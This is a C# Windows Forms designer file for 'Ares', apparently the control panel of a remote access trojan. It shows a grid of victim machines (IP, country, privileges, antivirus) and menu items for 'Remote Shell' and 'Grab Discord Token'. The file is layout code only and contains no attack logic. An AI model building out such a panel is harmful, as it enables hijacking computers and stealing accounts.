namespace Server
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            rTB_chatBox = new RichTextBox();
            dGV_clients = new DataGridView();
            Id = new DataGridViewTextBoxColumn();
            Culture = new DataGridViewTextBoxColumn();
            Country = new DataGridViewTextBoxColumn();
            Ipv6 = new DataGridViewTextBoxColumn();
            Ipv4 = new DataGridViewTextBoxColumn();
            OS = new DataGridViewTextBoxColumn();
            Privileges = new DataGridViewTextBoxColumn();
            Pcname = new DataGridViewTextBoxColumn();
            Antivirussoftware = new DataGridViewTextBoxColumn();
            cMS_clientManager = new ContextMenuStrip(components);
            compilerToolStripMenuItem = new ToolStripMenuItem();
            csharpToolStripMenuItem = new ToolStripMenuItem();
            pythonToolStripMenuItem = new ToolStripMenuItem();
            miscellaneousToolStripMenuItem = new ToolStripMenuItem();
            chatToolStripMenuItem = new ToolStripMenuItem();
            remoteShellToolStripMenuItem = new ToolStripMenuItem();
            clientInfoBindingSource = new BindingSource(components);
            lab_appProtocol = new Label();
            grabDiscordTokenToolStripMenuItem = new ToolStripMenuItem();
            ((System.ComponentModel.ISupportInitialize)dGV_clients).BeginInit();
            cMS_clientManager.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)clientInfoBindingSource).BeginInit();
            SuspendLayout();
            // 
            // rTB_chatBox
            // 
            rTB_chatBox.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            rTB_chatBox.BackColor = Color.Gray;
            rTB_chatBox.BorderStyle = BorderStyle.None;
            rTB_chatBox.Font = new Font("Segoe UI", 13F, FontStyle.Regular, GraphicsUnit.Point);
            rTB_chatBox.ForeColor = Color.White;
            rTB_chatBox.Location = new Point(12, 310);
            rTB_chatBox.Name = "rTB_chatBox";
            rTB_chatBox.ReadOnly = true;
            rTB_chatBox.Size = new Size(267, 129);
            rTB_chatBox.TabIndex = 1;
            rTB_chatBox.Text = "";
            // 
            // dGV_clients
            // 
            dGV_clients.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            dGV_clients.AutoGenerateColumns = false;
            dGV_clients.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            dGV_clients.BackgroundColor = Color.FromArgb(64, 64, 64);
            dGV_clients.BorderStyle = BorderStyle.None;
            dGV_clients.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            dGV_clients.Columns.AddRange(new DataGridViewColumn[] { Id, Culture, Country, Ipv6, Ipv4, OS, Privileges, Pcname, Antivirussoftware });
            dGV_clients.ContextMenuStrip = cMS_clientManager;
            dGV_clients.DataSource = clientInfoBindingSource;
            dGV_clients.GridColor = Color.White;
            dGV_clients.Location = new Point(12, 12);
            dGV_clients.Name = "dGV_clients";
            dGV_clients.RowTemplate.Height = 25;
            dGV_clients.Size = new Size(728, 292);
            dGV_clients.TabIndex = 3;
            // 
            // Id
            // 
            Id.DataPropertyName = "Id";
            Id.HeaderText = "Id";
            Id.Name = "Id";
            Id.ReadOnly = true;
            // 
            // Culture
            // 
            Culture.DataPropertyName = "Culture";
            Culture.HeaderText = "Culture";
            Culture.Name = "Culture";
            Culture.ReadOnly = true;
            // 
            // Country
            // 
            Country.DataPropertyName = "Country";
            Country.HeaderText = "Country";
            Country.Name = "Country";
            Country.ReadOnly = true;
            // 
            // Ipv6
            // 
            Ipv6.DataPropertyName = "Ipv6";
            Ipv6.HeaderText = "Ipv6";
            Ipv6.Name = "Ipv6";
            Ipv6.ReadOnly = true;
            // 
            // Ipv4
            // 
            Ipv4.DataPropertyName = "Ipv4";
            Ipv4.HeaderText = "Ipv4";
            Ipv4.Name = "Ipv4";
            Ipv4.ReadOnly = true;
            // 
            // OS
            // 
            OS.DataPropertyName = "OS";
            OS.HeaderText = "OS";
            OS.Name = "OS";
            OS.ReadOnly = true;
            // 
            // Privileges
            // 
            Privileges.DataPropertyName = "Privileges";
            Privileges.HeaderText = "Privileges";
            Privileges.Name = "Privileges";
            Privileges.ReadOnly = true;
            // 
            // Pcname
            // 
            Pcname.DataPropertyName = "Pcname";
            Pcname.HeaderText = "Pcname";
            Pcname.Name = "Pcname";
            Pcname.ReadOnly = true;
            // 
            // Antivirussoftware
            // 
            Antivirussoftware.DataPropertyName = "Antivirussoftware";
            Antivirussoftware.HeaderText = "Antivirussoftware";
            Antivirussoftware.Name = "Antivirussoftware";
            Antivirussoftware.ReadOnly = true;
            // 
            // cMS_clientManager
            // 
            cMS_clientManager.BackColor = SystemColors.Control;
            cMS_clientManager.Items.AddRange(new ToolStripItem[] { compilerToolStripMenuItem, miscellaneousToolStripMenuItem });
            cMS_clientManager.Name = "cMS_clientManager";
            cMS_clientManager.Size = new Size(181, 70);
            // 
            // compilerToolStripMenuItem
            // 
            compilerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { csharpToolStripMenuItem, pythonToolStripMenuItem });
            compilerToolStripMenuItem.Name = "compilerToolStripMenuItem";
            compilerToolStripMenuItem.Size = new Size(180, 22);
            compilerToolStripMenuItem.Text = "Compiler";
            // 
            // csharpToolStripMenuItem
            // 
            csharpToolStripMenuItem.Name = "csharpToolStripMenuItem";
            csharpToolStripMenuItem.Size = new Size(112, 22);
            csharpToolStripMenuItem.Text = "C#";
            csharpToolStripMenuItem.Click += csharpToolStripMenuItem_Click;
            // 
            // pythonToolStripMenuItem
            // 
            pythonToolStripMenuItem.Name = "pythonToolStripMenuItem";
            pythonToolStripMenuItem.Size = new Size(112, 22);
            pythonToolStripMenuItem.Text = "Python";
            // 
            // miscellaneousToolStripMenuItem
            // 
            miscellaneousToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { chatToolStripMenuItem, remoteShellToolStripMenuItem, grabDiscordTokenToolStripMenuItem });
            miscellaneousToolStripMenuItem.Name = "miscellaneousToolStripMenuItem";
            miscellaneousToolStripMenuItem.Size = new Size(180, 22);
            miscellaneousToolStripMenuItem.Text = "Client";
            // 
            // chatToolStripMenuItem
            // 
            chatToolStripMenuItem.Name = "chatToolStripMenuItem";
            chatToolStripMenuItem.Size = new Size(180, 22);
            chatToolStripMenuItem.Text = "Chat";
            chatToolStripMenuItem.Click += chatToolStripMenuItem_Click_1;
            // 
            // remoteShellToolStripMenuItem
            // 
            remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
            remoteShellToolStripMenuItem.Size = new Size(180, 22);
            remoteShellToolStripMenuItem.Text = "Remote Shell";
            remoteShellToolStripMenuItem.Click += remoteShellToolStripMenuItem_Click;
            // 
            // clientInfoBindingSource
            // 
            clientInfoBindingSource.DataSource = typeof(Models.ClientInfo);
            // 
            // lab_appProtocol
            // 
            lab_appProtocol.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
            lab_appProtocol.AutoSize = true;
            lab_appProtocol.Font = new Font("Segoe UI", 15F, FontStyle.Regular, GraphicsUnit.Point);
            lab_appProtocol.ForeColor = Color.White;
            lab_appProtocol.Location = new Point(12, 276);
            lab_appProtocol.Name = "lab_appProtocol";
            lab_appProtocol.Size = new Size(132, 28);
            lab_appProtocol.TabIndex = 4;
            lab_appProtocol.Text = "App-Protocol";
            // 
            // grabDiscordTokenToolStripMenuItem
            // 
            grabDiscordTokenToolStripMenuItem.Name = "grabDiscordTokenToolStripMenuItem";
            grabDiscordTokenToolStripMenuItem.Size = new Size(180, 22);
            grabDiscordTokenToolStripMenuItem.Text = "Grab Discord Token";
            grabDiscordTokenToolStripMenuItem.Click += grabDiscordTokenToolStripMenuItem_Click;
            // 
            // Form1
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.FromArgb(64, 64, 64);
            ClientSize = new Size(752, 451);
            Controls.Add(lab_appProtocol);
            Controls.Add(dGV_clients);
            Controls.Add(rTB_chatBox);
            Icon = (Icon)resources.GetObject("$this.Icon");
            Name = "Form1";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "Ares";
            ((System.ComponentModel.ISupportInitialize)dGV_clients).EndInit();
            cMS_clientManager.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)clientInfoBindingSource).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion
        private RichTextBox rTB_chatBox;
        private DataGridView dGV_clients;
        private BindingSource clientInfoBindingSource;
        private ContextMenuStrip cMS_clientManager;
        private ToolStripMenuItem compilerToolStripMenuItem;
        private ToolStripMenuItem csharpToolStripMenuItem;
        private ToolStripMenuItem pythonToolStripMenuItem;
        private DataGridViewTextBoxColumn Id;
        private DataGridViewTextBoxColumn Culture;
        private DataGridViewTextBoxColumn Country;
        private DataGridViewTextBoxColumn Ipv6;
        private DataGridViewTextBoxColumn Ipv4;
        private DataGridViewTextBoxColumn OS;
        private DataGridViewTextBoxColumn Privileges;
        private DataGridViewTextBoxColumn Pcname;
        private DataGridViewTextBoxColumn Antivirussoftware;
        private Label lab_appProtocol;
        private ToolStripMenuItem miscellaneousToolStripMenuItem;
        private ToolStripMenuItem chatToolStripMenuItem;
        private ToolStripMenuItem remoteShellToolStripMenuItem;
        private ToolStripMenuItem grabDiscordTokenToolStripMenuItem;
    }
}